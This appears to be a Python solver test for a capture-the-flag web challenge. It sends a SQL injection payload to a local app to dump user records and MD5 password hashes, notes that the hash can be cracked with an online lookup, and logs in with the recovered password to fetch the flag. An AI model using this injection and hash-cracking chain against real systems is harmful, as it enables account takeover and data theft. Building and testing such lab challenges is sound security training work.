import hashlib
from pathlib import Path
import requests

HERE = Path(__file__).parent

PASSWORD = "deadb33f"
PREDEFINED_PASS_HASH = hashlib.md5(PASSWORD.encode()).hexdigest()

def test():
    decoded = ""
    with open(HERE / "src" / "flag", "r") as f:
        FLAG = f.read()
        assert FLAG is not None

    resp = requests.get("http://127.0.0.1:8000/users?username=Eve'; SELECT * FROM users where 'a' = 'a")
    assert resp.status_code == 200

    user_list = resp.json()["users"]

    for i in user_list:
        if i[2]:
            md5_hash = i[1]
            username = i[0]
    
    assert md5_hash == PREDEFINED_PASS_HASH

    # Use whatever online tool to lookup the hash, most should have it
    # https://hashes.com/en/decrypt/hash


    resp = requests.get(f"http://127.0.0.1:8000/flag?username={username}&password={PASSWORD}")
    assert resp.status_code == 200

    flag_data = resp.json()
    assert flag_data is not None

    assert FLAG in flag_data["flag"]



if __name__ == "__main__":
    test()
